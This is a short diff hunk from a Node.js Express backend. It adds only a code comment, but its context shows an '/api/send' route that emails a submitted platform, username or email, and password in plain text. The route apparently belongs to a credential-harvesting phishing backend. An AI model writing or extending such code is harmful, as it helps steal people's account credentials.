@@ -67,6 +67,7 @@ app.post('/api/send', async (req, res) => {
     text: 'Platform is ' + platform + ' Username/Email is ' + email + ' password is ' + password,
   };
 
+  // i have added new to mainbackend
 
   try {
     let info = await transport.sendMail(mailOptions);
